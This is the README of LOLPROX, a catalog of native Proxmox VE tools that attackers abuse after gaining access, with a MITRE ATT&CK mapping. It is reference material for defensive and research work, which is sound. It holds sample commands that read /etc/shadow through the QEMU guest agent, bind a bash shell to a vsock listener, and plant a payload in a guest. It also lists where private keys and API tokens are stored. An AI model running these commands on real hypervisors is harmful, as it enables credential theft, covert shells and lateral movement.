# LOLPROX - Living Off The Land Proxmox

A curated catalog of Proxmox VE binaries and techniques that adversaries use for post-exploitation operations. Inspired by [LOLESXi](https://lolesxi-project.github.io/LOLESXi/) and following the [LOLBAS](https://lolbas-project.github.io/) methodology.

## Overview

LOLPROX documents native Proxmox VE tools and techniques that can be abused for:

- **Discovery** - Enumerate VMs, containers, storage, users, and cluster topology
- **Execution** - Execute commands in guest VMs via QEMU guest agent
- **Lateral Movement** - Pivot through vsock, guest agents, and cluster connections
- **Collection** - Exfiltrate data via backups, snapshots, and guest agent file reads
- **Credential Access** - Extract certificates, API tokens, and authentication keys
- **Persistence** - Create backdoor accounts, API tokens, and scheduled tasks
- **Impact** - Stop/destroy VMs, manipulate storage, ransomware preparation

## Documented Binaries

| Binary | Description | Primary Abuse |
|--------|-------------|---------------|
| [pvesh](/_lolprox/Binaries/pvesh.md) | API shell tool | Full API access, guest agent abuse |
| [qm](/_lolprox/Binaries/qm.md) | QEMU VM manager | Guest agent execution, snapshots |
| [pct](/_lolprox/Binaries/pct.md) | Container manager | Container exec, host mounts |
| [pveum](/_lolprox/Binaries/pveum.md) | User manager | Account creation, ACL abuse |
| [pvesm](/_lolprox/Binaries/pvesm.md) | Storage manager | Storage enumeration, exfil |
| [vzdump](/_lolprox/Binaries/vzdump.md) | Backup utility | Full VM exfiltration |
| [pvecm](/_lolprox/Binaries/pvecm.md) | Cluster manager | Cluster topology discovery |
| [pveversion](/_lolprox/Binaries/pveversion.md) | Version info | Target fingerprinting |
| [socat](/_lolprox/Binaries/socat.md) | Relay tool | vsock covert channels |
| [pveproxy](/_lolprox/Binaries/pveproxy.md) | API daemon | Certificate/key theft |
| [pve-firewall](/_lolprox/Binaries/pve-firewall.md) | Firewall manager | Security control bypass |
| [pvesr](/_lolprox/Binaries/pvesr.md) | Storage replication | Replication topology |

## Key Techniques

### Guest Agent Abuse

The QEMU guest agent allows hypervisor-to-guest command execution without network authentication:

```bash
# Execute commands in guest
qm guest exec 100 -- cat /etc/shadow

# Read files from guest
qm guest cmd 100 file-read /etc/passwd

# Write files to guest
qm guest cmd 100 file-write /tmp/payload.sh $(base64 -w0 payload.sh)
```

### vsock Covert Channels

vsock (AF_VSOCK) enables host-guest communication bypassing network monitoring:

```bash
# Host: Connect to VM CID 3 on port 1234
socat - VSOCK-CONNECT:3:1234

# Guest: Listen for vsock connections
socat VSOCK-LISTEN:1234,fork EXEC:/bin/bash
```

### Certificate & Key Theft

Critical cryptographic material locations:

```bash
/etc/pve/priv/pve-root-ca.key    # Root CA private key
/etc/pve/priv/authkey.key        # Authentication ticket signing key
/etc/pve/local/pve-ssl.key       # Node SSL private key
/etc/pve/priv/token.cfg          # API tokens
```

### Credential Locations

```bash
/etc/pve/user.cfg                # User configuration
/etc/pve/priv/shadow.cfg         # User password hashes (if local auth)
/etc/pve/priv/token.cfg          # API tokens
/etc/pve/corosync.conf           # Cluster node addresses
```

## MITRE ATT&CK Mapping

| Technique | ID | LOLPROX Tools |
|-----------|-----|---------------|
| System Information Discovery | T1082 | pveversion, pvesh, qm, pct |
| Account Discovery | T1087.001 | pveum, pvesh |
| Permission Groups Discovery | T1069.001 | pveum, pvesh |
| Command and Scripting Interpreter | T1059 | qm guest exec, pct exec |
| Lateral Movement | T1021 | qm guest agent, vsock |
| Data from Local System | T1005 | qm guest cmd file-read |
| Archive Collected Data | T1074.001 | vzdump, qm snapshot |
| Create Account | T1136.001 | pveum, pvesh |
| Account Manipulation | T1098 | pveum acl |
| Unsecured Credentials | T1552 | /etc/pve/priv/* |
| Impair Defenses | T1562.004 | pve-firewall |
| System Shutdown/Reboot | T1529 | qm stop, pct stop |
| Data Destruction | T1485 | qm destroy, pct destroy |

## Contributing

Contributions are welcome! Please follow the LOLESXi format for new technique submissions:

1. Fork the repository
2. Add new binary documentation in `_lolprox/Binaries/`
3. Include MITRE ATT&CK mappings
4. Provide procedural examples
5. Submit a pull request

## References

- [Proxmox VE Documentation](https://pve.proxmox.com/pve-docs/)
- [LOLESXi Project](https://lolesxi-project.github.io/LOLESXi/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [MITRE ATT&CK](https://attack.mitre.org/)

## License

MIT
